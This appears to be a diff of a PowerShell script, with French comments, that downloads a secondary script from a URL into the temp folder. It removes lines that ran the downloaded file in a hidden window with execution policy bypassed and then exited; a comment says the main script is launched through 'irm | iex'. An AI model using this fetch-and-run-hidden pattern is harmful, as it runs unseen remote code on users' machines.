@@ -7,9 +7,3 @@ $temp = "$env:TEMP\run_script.ps1"
 # Télécharger le script secondaire
 Invoke-WebRequest -Uri $scriptUrl -OutFile $temp
 
-# Lancer le script téléchargé dans une fenêtre PowerShell complètement cachée
-Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$temp`""
-
-# Fermer immédiatement le script principal (celui exécuté depuis irm | iex)
-exit
-
